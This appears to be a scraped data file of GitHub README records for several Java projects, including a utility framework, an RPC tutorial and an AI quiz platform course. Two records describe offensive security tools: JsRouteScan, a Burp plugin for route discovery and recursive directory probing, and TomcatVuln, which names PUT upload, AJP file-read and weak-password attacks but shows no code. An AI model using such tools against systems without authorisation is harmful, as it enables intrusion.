| [√] | bus-validate  | 参数校验，会默认拦截所有的标记有`@Valid`的方法或类                     |

### ✨ 功能概述

1. Java基础工具类，对文件、流、加密解密、转码、正则、线程、XML等JDK方法进行封装，组成各种工具类；
   以及结合springboot封装常用工具按需加载例如mybatis、xss、i18n、sensitive、validate等框架

2. 详细说明以及使用姿势请参考每个模块下README介绍

### ✨ 安装使用

#### Maven

```
<dependency>
    <groupId>org.miaixz</groupId>
    <artifactId>bus-all</artifactId>
    <version>x.x.x</version>
</dependency>
```

或者单独使用某个组件

```
<dependency>
    <groupId>org.miaixz</groupId>
    <artifactId>bus-xxx</artifactId>
    <version>x.x.x</version>
</dependency>
```

#### Gradle

```
implementation 'org.miaixz:bus-all:x.x.x'
```

#### Downlad

点击以下任一链接，下载`bus-*-x.x.x.jar`即可：

- [Maven中央库](https://repo1.maven.org/maven2/org/miaixz)

### ✨ 测试使用

为确保项目编译效率及相关规则，本项目所有单元测试及使用请参考`abarth`项目：

- 地址: [https://github.com/839128/abarth](https://github.com/839128/abarth)

> 注意
> Bus项目支持Java 17+，对Android平台部分模块没有测试，不能保证所有工具类或工具方法可用。

### ✨ 意见建议

All kinds of contributions (enhancements, new features, documentation & code improvements, issues & bugs reporting) are
welcome.

欢迎各种形式的贡献，包括但不限于优化，添加功能，文档 & 代码的改进，问题和 BUG 的报告。

### ✨ 设计理念

源码永远是最好的教程，善于读源码和DEBUG朋友掌握完全是轻而易举的事。源码是作者设计理念最直观的展现，这也是开源的魅力所在。
""Talk is cheap, Show me the code.""
，开源让技术难题的探讨变得更加务实，在您看完源码后心中对它都会有一个定论。在作者看来，Bus切切实实降低了开发学习门槛，也保障了服务的高性能、高可用。如果读者朋友对源码中某些部分的设计存在疑虑，也欢迎与作者保持沟通。

### ✨ 项目状态

![alt](https://repobeats.axiom.co/api/embed/e6aec865b2638153d492db3db4ab8f09b39725cd.svg ""repobeats analytics image"")",Bus (应用/服务总线) 是一个基础框架、服务套件，它基于Java17+ 编写，参考、借鉴了大量已有框架、组件的设计，可以作为后端服务的开发基础中间件。代码简洁，架构清晰，非常适合学习使用。,"bus,cache,crypto,hl7,java21,logger,mybatis,opencv,socket,spring-boot",2024-04-19T02:00:47Z,2024-09-24T10:25:08Z,2024-09-24T10:25:08Z,16,6,18,1727,0,31,222,3,1,MIT,Java
F6JO/JsRouteScan,main,"# JsRouteScan <img src=""https://komarev.com/ghpvc/?username=JsRouteScan"" />
Burpsuite - Js Route Scan 正则匹配获取响应中的路由进行探测或递归目录探测的burp插件

***



## 感谢

* 参考项目 [yitaiqiFilterJs](https://github.com/fKzhangsa/FilterJs)

## 介绍

JsRouteScan是使用java语言根据burpsuite api编写的burpsuite插件。

插件通过被动扫描的方式，根据指定正则列表在响应包中匹配疑似路由的字符串，然后可以根据设定，被动探测根目录或者其他目录。也提供了将匹配到的路由作为payload，递归探测当前网站所有路径中的每一层路径。

## 功能介绍

装载插件：``` Extender - Extensions - Add - Select File - Next ```

初次装载插件会在```用户目录/.config/JsRouteScan/```目录下生成config.yaml文件，其中包含了 

* Regexs（在响应中匹配路由的正则表达式列表）
* ExRouteRegexs（在响应中排除路由的正则表达式列表）
* ExSuffix（排除匹配相应的后缀列表，符合列表中后缀的请求将不会在响应中匹配路由）

<img src=""./img/yaml.jpg"">

Config面板用来设置插件中被动探测的一些配置，此面板中的配置会应用到所有匹配的网站中。

* PassiveStart按钮：被动探测启动按钮，开启后所有匹配到的路由都会以Passive Scan Path中的值作为根目录来请求。
* CarryHead按钮：携带请求头按钮，开启后所有由插件发起的请求均会携带原始请求头。（此请求头为第一次获取到路由的请求头）
* Thread Pools Number：线程池的线程数
* Request Method：请求的方式，包含GET与POST
* Passive Scan Path：被动探测的根目录，默认为/

<img src=""./img/config.jpg"">

ReqDisplay面板用来存储获取到路由的网站host头，与当前网站获取的路由，以及当前网站的扫描结果。

右边的配置只会对当前网站起效。

* Scan Root Path：主动扫描的根目录
* Scan按钮：点击后会获取PATH中的所有路由，对当前网站发起扫描，根目录为Scan Root Path的值
* Recursion-Scan按钮：递归扫描，点击后会获取PATH中的所有路由，然后递归对当前网站的每一层路径进行扫描
* SetHead按钮：点击后会设置当前网站的head头，生效需打开Config的CarryHead按钮

<img src=""./img/ReqDisplay.jpg"">

scan面板用来展示请求的内容以及扫描的内容，此面板不会自动更新，需要右键Refresh

<img src=""./img/scan.jpg"">

## 提示

​	Recursion-Scan功能一定要注意PATH中的路由数量，没用的删一删再扫，递归扫描的请求数量是 目录层级*路由数量 的哦。
## 更新计划
* 自定义head头 2024-04-10 √
* 添加自定义post或get参数
* 配置文件在线更新？
* 右键粘贴剪切板内容到path界面 2024-06-07 √

## 开心值

[![Stargazers over time](https://starchart.cc/F6JO/JsRouteScan.svg?variant=adaptive)](https://starchart.cc/F6JO/JsRouteScan)

## 最后
如有匹配正则、BUG、需求等欢迎提Issues

",Burpsuite - Js Route Scan 正则匹配获取响应中的路由进行被动探测与递归目录探测的burp插件,,2024-04-09T08:51:45Z,2024-06-07T08:56:12Z,2024-06-07T08:51:34Z,4,1,0,16,6,10,201,1,0,,Java
youngyangyang04/RPC-Java,main,"# RPC-Java

[【代码随想录知识星球】](https://www.programmercarl.com/other/kstar.html)项目分享-手撕RPC框架，[项目专栏](https://t.zsxq.com/0CVPn) 有本项目的详细文档

* [第一章：项目背景、项目收获、简历写法、项目架构和流程图](https://t.zsxq.com/RtJmQ)
* [第二章（版本一）：实现一个基本的rpc调用](https://t.zsxq.com/QImhy)
* [第三章（版本二）：netty自定义编码器，解码器和序列化器，创建缓存](https://t.zsxq.com/osLak)
* [第四章（版本三）：负载均衡、超时重试 &白名单](https://t.zsxq.com/zVqPE)
* [第五章（版本四）：服务-限流、熔断](https://t.zsxq.com/Oj1gG0)
* [第六章：项目常见问题以及如何回答（网络传输层面，注册中心层面，算法层面，各种场景题](https://t.zsxq.com/xOAAq)

## 启动流程

1.先安装并开启zookeeper

安装参考：

[【Zookeeper】Windows下安装Zookeeper（图文记录详细步骤，手把手包安装成功）_windows安装zk-CSDN博客](https://blog.csdn.net/tttzzzqqq2018/article/details/132093374?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172149339116800211548359%2522%252C%2522scm%2522%253A%252220140713.130102334)

2.运行Server包下的TestServer,再运行Client包下的TestClient



# RPC概念

### 概念

1. RPC（Remote Procedure Call Protocol） 远程过程调用协议。
2. RPC是一种通过网络从远程计算机程序上请求服务，不需要了解底层网络技术的协议。
3. RPC主要作用就是不同的服务间方法调用就像本地调用一样便捷。



### 常用RPC技术或框架

应用级的服务框架：阿里的 Dubbo/Dubbox、Google gRPC、Spring Boot/Spring Cloud。
远程通信协议：RMI、Socket、SOAP(HTTP XML)、REST(HTTP JSON)。
通信框架：MINA 和 Netty



### 为什么要有RPC？

1. 服务化：微服务化，跨平台的服务之间远程调用；
2. 分布式系统架构：分布式服务跨机器进行远程调用；
3. 服务可重用：开发一个公共能力服务，供多个服务远程调用。
4. 系统间交互调用：两台服务器A、B，服务器A上的应用a需要调用服务器B上的应用b提供的方法，而应用a和应用b不在一个内存空间，不能直接调用，此时，需要通过网络传输来表达需要调用的语义及传输调用的数据。

#### 使用场景

1. `大型网站`：内部涉及多个子系统，服务、接口较多。
2. `注册发现机制`：如Nacos、Dubbo等，一般都有注册中心，服务有多个实例，调用方调用的哪个实例无感知。
3. `安全性`：不暴露资源
4. `服务化治理`：微服务架构、分布式架构。



### 架构图

![](README.assets/655c04a02b08474e985ff4bf8a561d12.png)



### 核心功能概念

核心功能实现主要分为**服务寻址**、**序列化和反序列化**、**网络传输功能**。

#### 服务寻址功能

**Call ID映射：**

​	本地：在本地方法调用中，函数体是直接通过函数指针来指定的，但是在远程调用中，由于两个进程的地址空间完全不一样，函数指针不起作用。
​	远程：RPC中所有函数或方法都有自己的一个ID，在所有进程中都唯一。客户端在做远程过程调用时，必须附上这个ID，即客户端会查一下表，找出相应的Call ID，然后传给服务端，服务端也会查表，来确定客户端需要调用的函数，然后执行相应函数的代码。
​	Call ID映射表一般是一个哈希表。



#### 序列化和反序列化功能

**概述：**

- 序列化：将消息对象转换为二进制流。
- 反序列化：将二进制流转换为消息对象。



**必要性**：
远程调用涉及到数据的传输，在本地调用中，只需要将数据压入栈中，然后让函数去栈中读取即可。
但远程的数据传输，由于客户端和服务端不在同一个服务器上，涉及不同的进程，不能通过内存传递参数，此时就需要将客户端先将请求参数转成字节流（编码），传递给服务端，服务端再将字节流转为自己可读取格式（解码），这就是序列化和反序列化的过程。反之，服务端返回值也逆向经历序列化和反序列化到客户端。

**序列化的优势：**
将消息对象转为二进制字节流，便于网络传输。
可跨平台、跨语言。如Python编写的客户端请求序列化参数传输到Java编写的服务端进行反序列化。

#### 网络传输功能

**作用**：

- 客户端将Call ID和序列化后的参数字节流传输给服务端。
- 服务端将序列化后的调用结果回传给客户端。

**协议**：
  主要有TCP、UDP、HTTP协议。

**基于TCP协议**

​	客户端和服务端建立Socket连接。
​	客户端通过Socket将需要调用的接口名称、方法名称及参数序列化后传递给服务端。
服务端反序列化后再利用反射调用对应的方法，将结果返回给客户端。

**基于HTTP协议**

​	客户端向服务端发送请求，如GET、POST、PUT、DELETE等请求。
​	服务端根据不同的请求参数和请求URL进行方法调用，返回JSON或者XML数据结果。

**TCP和HTTP对比**

- 基于TCP协议实现的RPC调用，由于是底层协议栈，更佳灵活的对协议字段进行定制，可减少网络开销，提高性能，实现更大的吞吐量和并发数。但**，底层复杂，实现代价高**。
- 基于HTTP协议实现的RPC调用，已封装实现序列化，但HTTP属于应用层协议，HTTP传输**所占用的字节数比TCP更高，传输效率对比TCP较低**。







# 版本一

**part1**

- 实现基本的rpc调用
- 客户端动态代理
- 定义统一的request和response

**part2**

- 引入netty框架进行信息传输
- 自定义消息格式

**part3**

- 引入zookeeper作为注册中心



![1720376325450](README.assets/1720376325450.png)



# 版本二

**part1**

- netty自定义编码器，解码器和序列化器



**part2**

- 在客户端建立本地服务缓存

- 实现本地缓存的动态更新

  

![1720376518663](README.assets/1720376518663.png)





# 版本三

**part1**

- 实现客户端的负载均衡



**part2**

- 实现客户端的容错：失败重传
- 服务白名单



![1720376674829](README.assets/1720376674829.png)





# 版本四

**part1**

- 服务限流，降级的实现
- 熔断器的实现





![1720376759165](README.assets/1720376759165.png)





# TodoList

- [ ] 补充其它序列化方式（如ProtoBuf，Hessian）

- [ ] 集成Spring

- [ ] 主动下线失败次数过多的节点

- [ ] 探测离线节点的状态，对恢复正常的节点重新上线

- [ ] 实现自适应的负载均衡器

  
",【代码随想录知识星球】项目分享-手撕RPC框架🔥,,2024-04-16T07:36:56Z,2024-07-31T14:12:45Z,,0,2,14,32,8,41,199,1,0,,Java
liyupi/yudada,master,"# 鱼答答 - AI 答题应用平台

> 作者：[程序员鱼皮](https://yuyuanweb.feishu.cn/wiki/Abldw5WkjidySxkKxU2cQdAtnah)
>
> ⭐️ 加入项目系列学习：[加入编程导航](https://yuyuanweb.feishu.cn/wiki/SDtMwjR1DituVpkz5MLc3fZLnzb) 



## 项目简介

### 项目介绍

深入业务场景的企业级实战项目，基于 Vue 3 + Spring Boot + Redis + ChatGLM AI + RxJava + SSE 的 **AI 答题应用平台。**

用户可以基于 AI 快速制作并发布多种答题应用，支持检索和分享应用、在线答题并基于评分算法或 AI 得到回答总结；管理员可以审核应用、集中管理整站内容，并进行统计分析。

> 视频介绍：https://www.bilibili.com/video/BV1m142197hg



### 项目四大阶段

该项目选题新颖、业务完整、技术亮点多，为了帮大家循序渐进地学习，鱼皮将项目设计为 4 个阶段，通俗易懂：

1）第一阶段，开发本地的 `MBTI 性格测试小程序`。带大家熟悉答题应用的开发流程和原理，从 0 到 1 实战 Taro 跨端微信小程序开发，并分享小程序开发经验。

![](https://pic.yupi.icu/1/image-20240604145837172.png)

2）第二阶段，上升一个层次，开发 `答题应用平台`。用户可以通过上传题目和自定义评分规则，创建答题应用，供其他用户检索和使用。该阶段涉及 Vue 3 + Spring Boot 前后端全栈项目从 0 到 1 的开发。

![](https://pic.yupi.icu/1/20240604145229177.png)

3）第三阶段，让 AI 为平台赋能，开发 `AI 智能答题应用平台`。用户只需设定主题，就能通过 AI 快速生成题目、让 AI 分析用户答案，极大降低创建答题应用的成本、提高回答多样性。是从 0 到 1 的 AI 应用开发教程，封装 AI 通用模块并教你成为 Prompt 大师！

![](https://pic.yupi.icu/1/20240604145229383.png)

4）第四阶段，通过多种企业开发技术手段进行 `项目优化`。包括 RxJava + SSE 优化 AI 生成体验、通过缓存和分库分表优化性能、通过幂等设计和线程池隔离提高系统安全性、通过统计分析和应用分享功能来将应用 “产品化” 等等，涉及大量干货！

在这个项目中，鱼皮还会带大家用 AI 工具 `CodeGeeX 智能编程助手` 提高开发效率，是不是已经迫不及待了呢？

 

### 项目展示

本项目涉及 10 多个页面，前面已经展示部分页面。

应用详情页：

![](https://pic.yupi.icu/1/20240604145229915.png)

用户答题页面：

![](https://pic.yupi.icu/1/20240604145230156.png)

创建应用页：

![](https://pic.yupi.icu/1/20240604145230361.png)

创建题目页，涉及复杂动态嵌套表单的开发：

![](https://pic.yupi.icu/1/20240604145230557.png)

应用管理页面：

![](https://pic.yupi.icu/1/20240604145230731.png)

统计分析页面：

![](https://pic.yupi.icu/1/20240604145230905.png)

应用分享功能：

![](https://pic.yupi.icu/1/20240604145231269.png)



### 免费试看

感兴趣的同学可以 **免费试看** 第一期项目回放：https://www.bilibili.com/video/BV1m142197hg



## 项目特点

鱼皮 **从 0 到 1 全程直播无剪辑** 地带大家开发完成项目，包括 **视频教程** 和 **文字教程**！从需求分析、技术选型、项目设计、项目初始化、Demo 编写、前后端开发实现、项目优化、部署上线等，每个环节我都 **从理论到实践** 给大家讲的明明白白、每个细节都不放过！

细致入微的教程：

![](https://pic.yupi.icu/1/20240604145231642.png)

满满的项目正反馈：

![](https://pic.yupi.icu/1/20240604145231908.png)



### 为什么要带做这个项目？

1）**业务真实新颖**：别人做答题应用，你做 AI 应用平台。需求实用价值更高，可以扩展出很多新奇有趣的热门应用。

2）**技术主流新颖**：基于企业主流前后端技术实现，再结合当下最热门的 AI 技术，比传统项目更有亮点。

3）**能学到东西**：不再是增删改查的项目，而是包含了大量的实际业务场景、系统设计优化、企业级解决方案。

4）**教程资料少**：市面上虽然有 AI 应用平台，但几乎没有从 0 到 1 的实战教程，鱼皮将提供细致入微的讲解。

5）**增加竞争力**：区别于各种管理平台项目，本项目涉及响应式编程、分库分表、设计模式、性能优化、多角度系统优化、产品优化的实战，给你的简历增加竞争力。



### 项目收获

鱼皮给大家讲的都是 **通用的项目开发方法和架构设计套路**，从这个项目中你可以学到：

- 如何拆解复杂业务，从 0 开始设计实现系统？
- 如何快速开发小程序、响应式网站和后端项目？
- 如何自己制作一套 Vue 3 万用前端模板？
- 如何巧用 JSON 实现复杂评分策略？
- 如何巧妙利用设计模式来优化代码？
- 如何利用 AI 工具 `CodeGeeX 智能编程助手` 提高开发效率？
- 如何利用 SSE 技术实时推送通知？
- 如何利用 Redis + Caffeine + 分布式锁实现稳定高效的缓存？
- 如何通过 RxJava 反应式编程 + 分库分表提升服务性能？
- 如何通过幂等设计、线程池隔离提升系统安全稳定性？

此外，还能学会很多思考问题、对比方案、产品设计的方法，提升排查问题、自主解决 Bug、产品理解的能力，成为一个项目负责人。



### 鱼皮系列项目优势

鱼皮原创项目系列以 **实战** 为主，用 **全程直播** 的方式，**从 0 到 1** 带大家学习技术知识，并立即实践运用到项目中，做到学以致用。

此外，还提供如下服务：

- 详细的直播笔记（本项目有全套文字教程）
- 完整的项目源码（分节的代码，更易学习）
- 答疑解惑
- 专属项目交流群
- ⭐️ 现成的简历写法（直接写满简历）
- ⭐️ 项目的扩展思路（拉开和其他人的差距）
- ⭐️ 项目相关面试题、题解和真实面经（提前准备，面试不懵逼）
- ⭐️ 前端 + Java 后端万用项目模板（快速创建项目）

比起看网上的教程学习，鱼皮项目系列的优势：

> 从学知识 => 实践项目 => 复习笔记 => 项目答疑 => 简历写法 => 面试题解的一条龙服务

从需求分析、技术选型、项目设计、项目初始化、Demo 编写、前后端开发实现、项目优化、部署上线等，每个环节我都 **从理论到实践** 给大家讲的明明白白、每个细节都不放过！

编程导航已有 **10 多套项目教程！** 每个项目的学习重点不同，几乎全都是前端 + 后端的 **全栈** 项目 。

详细请见：https://yuyuanweb.feishu.cn/wiki/SePYwTc9tipQiCktw7Uc7kujnCd



## 架构设计

### 1、核心业务流程图

![](https://pic.yupi.icu/1/20240604145232082.png)

### 2、时序图

![](https://pic.yupi.icu/1/20240604145232239.png)

### 3、架构设计图

![](https://pic.yupi.icu/1/20240604145232474.png)



## 技术选型

### 后端

- Java Spring Boot 开发框架（万用后端模板）
- 存储层：MySQL 数据库 + Redis 缓存 + 腾讯云 COS 对象存储
- MyBatis-Plus 及 MyBatis X 自动生成
- Redisson 分布式锁
- Caffeine 本地缓存
- ⭐️ 基于 ChatGLM 大模型的通用 AI 能力
- ⭐️ RxJava 响应式框架 + 线程池隔离实战 
- ⭐️ SSE 服务端推送
- ⭐️ Shardingsphere 分库分表
- ⭐️ 幂等设计 + 分布式 ID 雪花算法
- ⭐️ 多种设计模式
- ⭐️ 多角度项目优化：性能、稳定性、成本优化、产品优化等



### 前端

#### Web 网页开发

- Vue 3 
- Vue-CLI 脚手架
- Axios 请求库
- Arco Design 组件库
- 前端工程化：ESLint + Prettier + TypeScript
- 富文本编辑器
- QRCode.js 二维码生成
- ⭐️ Pinia 状态管理
- ⭐️ OpenAPI 前端代码生成

#### 小程序开发

- React
- Taro 跨端开发框架
- Taro UI 组件库

### 开发工具

- 前端 IDE：JetBrains WebStorm
- 后端 IDE：JetBrains IDEA
- [CodeGeeX 智能编程助手](https://codegeex.cn/)



## 项目大纲

### 第一阶段：MBTI 性格测试小程序

1. 项目介绍 | 项目背景和优势
2. 项目介绍 | 核心业务流程
3. 项目介绍 | 项目功能梳理
4. 项目介绍 | 技术选型和架构设计
5. MBTI 小程序 | 性格测试应用介绍
6. MBTI 小程序 | 实现方案和评分原理
7. MBTI 小程序 | Taro + React 小程序入门
8. MBTI 小程序 | 小程序开发实战
9. MBTI 小程序 | 小程序开发常用解决方案

### 第二阶段：Web 答题应用平台

1. 平台开发 | 需求分析
2. 平台开发 | 库表设计
3. 平台开发 | 后端初始化
4. 平台开发 | 后端基础开发
5. 平台开发 | 后端核心业务流程开发
6. 平台开发 | 前端技术选型
7. 平台开发 | 前端项目初始化
8. 平台开发 | 前端 Vue 3万用模板开发
9. 平台开发 | 前端基础页面开发（管理页面）
10. 平台开发 | 前端应用主页开发
11. 平台开发 | 前端应用详情页开发
12. 平台开发 | 前端创建模块开发 - 创建应用
13. 平台开发 | 前端创建模块开发 - 创建题目
14. 平台开发 | 前端创建模块开发 - 创建评分
15. 平台开发 | 前端答题模块开发 - 应用答题
16. 平台开发 | 前端答题模块开发 - 答题结果
17. 平台开发 | 前端答题模块开发 - 我的回答

### 第三阶段：AI 智能答题应用平台

1. 平台智能化 | 智谱 AI 大模型介绍
2. 平台智能化 | 智谱 AI SDK 接入
3. 平台智能化 | 通用 AI 模块封装
4. 平台智能化 | AI 生成题目 - 方案设计（Prompt）
5. 平台智能化 | AI 生成题目 - 后端开发
6. 平台智能化 | AI 生成题目 - 前端开发
7. 平台智能化 | AI 智能评分 - 方案设计（Prompt）
8. 平台智能化 | AI 智能评分 - 后端开发
9. 平台智能化 | AI 智能评分 - 前端开发
10. 扩展知识 | Spring AI
11. 扩展知识 | 智谱 AI + Spring AI 整合应用

### 第四阶段：多角度项目优化

1. 性能优化 | RxJava 响应式编程 - 核心概念
2. 性能优化 | RxJava 响应式编程 - Demo 实操
3. 性能优化 | AI 生成题目优化 - 需求分析
4. 性能优化 | AI 生成题目优化 - 前后端实时通讯（SSE 技术）
5. 性能优化 | AI 生成题目优化 - 后端开发
6. 性能优化 | AI 生成题目优化 - 前端开发
7. 性能优化 | AI 评分优化 - 需求分析
8. 性能优化 | AI 评分优化 - 方案设计（缓存设计）
9. 性能优化 | AI 评分优化 - 后端本地缓存开发
10. 性能优化 | AI 评分优化 - Redisson 解决缓存击穿
11. 性能优化 | 分库分表 - 核心概念
12. 性能优化 | 分库分表 - 技术选型
13. 性能优化 | 分库分表 - Sharding JDBC 实战
14. 系统优化 | 幂等设计 - 主流方案
15. 系统优化 | 幂等设计 - 分布式唯一 id 生成
16. 系统优化 | 幂等设计 - 后端开发
17. 系统优化 | 幂等设计 - 前端开发
18. 系统优化 | 线程池隔离 - 方案设计
19. 系统优化 | 线程池隔离 - 开发实现
20. 系统优化 | 统计分析 - 方案选型
21. 系统优化 | 统计分析 - 自定义 SQL
22. 系统优化 | 统计分析 - 后端开发
23. 系统优化 | 统计分析 - 前端可视化
24. 系统优化 | 应用分享 - 移动端扫码分享
25. 系统优化 | 应用分享 - 通用分享组件



## 项目资料

包括：

- 学习计划、视频教程、文字教程、项目源码
- 项目答疑、项目交流群、学员笔记
- 简历写法、面试题解、扩展思路

以上资料均可在编程导航网站获取：https://www.code-nav.cn/course/1790274408835506178

点击 [加入编程导航](https://yuyuanweb.feishu.cn/wiki/SDtMwjR1DituVpkz5MLc3fZLnzb) 后，可以按照帖子 https://t.zsxq.com/eJxjY 的引导认证并解锁项目资料的权限。如图：

![](https://pic.yupi.icu/1/20240604145232643.png)



## 更多项目

请见：[项目实战 - 鱼皮原创项目教程系列](https://yuyuanweb.feishu.cn/wiki/SePYwTc9tipQiCktw7Uc7kujnCd)



## 加入学习

欢迎 [点此加入编程导航](https://yuyuanweb.feishu.cn/wiki/SDtMwjR1DituVpkz5MLc3fZLnzb) ，学习大量优质原创项目，享受更多原创资料，开启你的编程起飞之旅~

",新项目，基于 Vue 3 + Spring Boot + Redis + ChatGLM + RxJava + SSE 的 AI 答题应用平台。 用户可以基于 AI 快速制作并发布答题应用，支持检索、分享、在线答题并基于 AI 得到回答总结；管理员可以集中管理和审核应用。,"ai,backend,frontend,java,redis,springboot,vue",2024-04-25T07:48:49Z,2024-06-04T07:04:38Z,,0,1,0,9,0,36,182,1,0,,Java
errors11/TomcatVuln,master,"# TomcatVuln
## put文件上传
![put.png](put.png)
![img.png](img.png)
## ajp协议漏洞
默认读取web.xml文件，漏洞利用方式是通过web.xml文件读取其中的class文件到本地
![img_1.png](img_1.png)
![img_4.png](img_4.png)
![img_5.png](img_5.png)
## 弱口令漏洞
![img_2.png](img_2.png)
![img_3.png](img_3.png)",Tomcat漏洞利用工具,,2024-04-16T12:01:02Z,2024-04-18T11:52:42Z,2024-04-18T06:25:24Z,1,1,0,4,4,12,174,1,0,,Java
DHD2280/Oxygen-Customizer,beta,"# Oxygen Customizer

<div align=""center"">
  <img src="".github/resources/banner.png"" width=""90%"" alt=""banner"" />
</div>
<p align=""center"">
  <a href=""https://github.com/DHD2280/Oxygen-Customizer/releases""><img src=""https://img.shields.io/github/v/release/DHD2280/Oxygen-Customizer?style=for-the-badge&include_prereleases"" alt=""Release""></a>
  <a href=""https://github.com/DHD2280/Oxygen-Customizer/releases/tag/beta_builds""><img src=""https://img.shields.io/badge/Download%20Latest-Beta-blue?style=for-the-badge"" alt=""Beta""></a>
  <a href=""https://github.com/DHD2280/Oxygen-Customizer""><img alt=""Repo Size"" src=""https://img.shields.io/github/repo-size/DHD2280/Oxygen-Customizer?style=for-the-badge""></a>
  <a href=""https://github.com/DHD2280/Oxygen-Customizer/actions""><img src=""https://img.shields.io/github/actions/workflow/status/DHD2280/Oxygen-Customizer/build_debug.yml?branch=beta&label=Nightliy%20Build&style=for-the-badge"" alt=""Nightly Build""></a>
  <a href=""https://t.me/OxygenCustomizerGroup""><img src=""https://img.shields.io/badge/Support%20Group-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white"" alt=""Support Group""></a>
  <a href=""https://t.me/OxygenCustomizer""><img src=""https://img.shields.io/badge/Update%20Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white"" alt=""Update Channel""></a>
</p>
<div align=""center"">

### Free and Open-Source Oxygen OS Customizer Application

</div>
<p align=""center"">
Oxygen Customizer is an open-source Android application aimed at providing users with the ability to tweak and customize various aspects of Oxygen OS UI.
<br><br>
Furthermore, the open-source nature of Oxygen Customizer encourages community contributions and continuous improvement, ensuring a dynamic and evolving user experience.
</p>

## Table of Contents

- [Requirements](#-requirements)
- [Installation](#-installation)
- [Permissions](#-permissions)
- [Contribution](#-contribution)
- [FAQ](#-faq)
- [Credits](#-credits)
- [License](#-license)
- [Disclaimer](#-disclaimer)
- [Donations](#-donations)

> [!CAUTION]
> 
> This app requires Magisk, KernelSU & APatch for root access and XPosed/LSPosed framework. Any alternative methods won't work.

# 🛠 Requirements

- Oxygen OS 14

- [Magisk](https://github.com/topjohnwu/Magisk) (Recommended) or [KernelSU](https://github.com/tiann/KernelSU) or [APatch](https://github.com/bmax121/APatch)

- [LSPosed](https://github.com/LSPosed/LSPosed)

# 👨‍💻 Installation

  1. Download and install Oxygen Customizer app.

  2. Enable app in LSPosed.
  
  3. Restart your device.

# 🔒 Permissions

This app requires the following permissions:

`
android.permission.ACCESS_NETWORK_STATE
android.permission.INTERNET
android.permission.ACCESS_FINE_LOCATION
android.permission.ACCESS_COARSE_LOCATION
android.permission.ACCESS_BACKGROUND_LOCATION
`
Permissions to access the internet and location are required for fetching weather data and location-based services. These permissions are essential for the proper functioning of the Lockscreen Weather and are not used for any other purposes.

`android.permission.USE_BIOMETRIC`
Permission to use biometric authentication is required for showing the Authentiation Prompt when enabled for Advanced Reboot Menu.

`android.permission.VIBRATE`
Permission to vibrate the device is required for haptic feedback when using the app.

`
android.permission.WRITE_EXTERNAL_STORAGE
android.permission.READ_EXTERNAL_STORAGE
android.permission.MANAGE_EXTERNAL_STORAGE
`
Permissions to read and write external storage are required for saving and loading custom images/fonts. These permissions are essential for the proper functioning of the app and are not used for any other purposes.

# 🤝 Contribution

We highly appreciate and welcome all forms of contributions, ranging from code, documentation, graphics, design suggestions, to bug reports. We encourage you to make the most of GitHub's collaborative platform by submitting Pull Requests, providing tutorials or other relevant content. Whatever you have to offer, we value and can utilize it effectively in our project.

# 🤓 FAQ

<details>
  <summary>Do I need a root access for Oxygen Customizer to work?</summary>

- Yes, root access is required for Oxygen Customizer to function properly.
</details>

<details>
  <summary>Which devices does Oxygen Customizer support?</summary>

- Oxygen Customizer exclusively supports Oxygen OS 14 and later versions. Compatibility with other devices or custom ROMs is not guaranteed.
</details>

<details>
  <summary>Is Android version ""xx"" supported?</summary>

- Oxygen Customizer officially supports Android 14 and later versions. Compatibility with earlier Android versions is not provided, and there are no plans to introduce support for those versions.
</details>

<details>
  <summary>I got bootloop. How do I fix it?</summary>

- Boot into [Safe Mode](https://www.androidauthority.com/how-to-enter-safe-mode-android-801476/) and uninstall module.
</details>

<details>
  <summary>What is the difference between Release build and Debug build?</summary>

- [Release build](https://github.com/DHD2280/Oxygen-Customizer/releases/latest) is an optimized version intended for distribution to end-users, while [Debug build](https://github.com/DHD2280/Oxygen-Customizer/actions) includes additional features and information for debugging and development purposes.
</details>

<details>
  <summary>Can I use Oxygen Customizer in conjunction with other customization apps?</summary>

- Yes, Oxygen Customizer can be used alongside other customization apps. However, it's important to note that conflicts or overlapping modifications may occur, which could affect the overall user experience.
</details>

<details>
  <summary>I found a bug. How do I report it?</summary>

- To report a bug, please navigate to the [Issues](https://github.com/DHD2280/Oxygen-Customizer/issues/new/choose) section. Create a new issue and ensure you select the `Bug Report` template. Provide as much detailed information as possible, including steps to reproduce the bug and any relevant error messages or screenshots.
</details>

<details>
  <summary>How do I request a new feature?</summary>

- If you have a feature request, please go to the [Issues](https://github.com/DHD2280/Oxygen-Customizer/issues/new/choose) section. Create a new issue and choose the `Feature Request` template. Be sure to include comprehensive details about the desired feature, its potential benefits, and any other relevant information that can assist in understanding and evaluating the request.
</details>

<details>
  <summary>Where can I make a donation?</summary>

- You can donate via ""[PayPal](https://www.paypal.me/luigifale)"", or via ""[Buy me a coffee](https://www.buymeacoffee.com/DHD2280)"".
</details>

# ❤ Credits

### Thanks to:

- [Android Open Source Project (AOSP)](https://source.android.com) for Android source code.
- [OnePlus](https://www.oneplus.com) for Oxygen OS.
- [Material Icons](https://fonts.google.com/icons) for in-app icons.
- [PixelXpert](https://github.com/siavash79/PixelXpert), [@siavash79](https://github.com/siavash79) for help with Xposed mods, and his great work with Pixel Xpert.
- [Iconify](https://github.com/Mahmud0808/Iconify), [@Mahmud0808](https://github.com/Mahmud0808) for bringing the idea of Iconify and his great work. 
- [crDroid](https://github.com/crdroidandroid) for Pulse Controller and some tweaks.
- [OmniROM](https://github.com/omnirom) for the Weather Providers.
- [Project Matrixx](https://github.com/ProjectMatrixx) for some illustrations.
- [SuperiorExtended](https://github.com/SuperiorExtended) for some tweaks and layouts.
- And everyone who [contributed](https://github.com/DHD2280/Oxygen-Customizer/graphs/contributors) and [translated](https://crowdin.com/project/oxygen-customizer/members)... :)


# © License

Oxygen Customizer is licensed under GPLv3. Please see [`LICENSE`](./LICENSE.md) for the full license text.

# 📝 Disclaimer

> [!WARNING]
> - Please note that Oxygen Customizer may not be fully compatible with all custom OOS variants.
> - I cannot be held responsible for any potential damage or issues that may occur to your device while using Oxygen Customizer.

# ⭐ Donations

<div align=""left"">
  <br>
  <a href=""https://www.buymeacoffee.com/DHD2280""><img src="".github/resources/bmc-button.png"" width=""30%"" alt=""Buy me a coffee"" /></a>
  <br><br>
  <a href=""https://www.paypal/luigifale""><img src="".github/resources/PayPal.svg"" width=""34%"" alt=""PayPal"" /></a>
</div>
",Customize Oxygen OS,,2024-04-21T22:40:39Z,2024-09-24T18:14:10Z,,5,4,38,803,7,7,157,3,5,GPL-3.0,Java
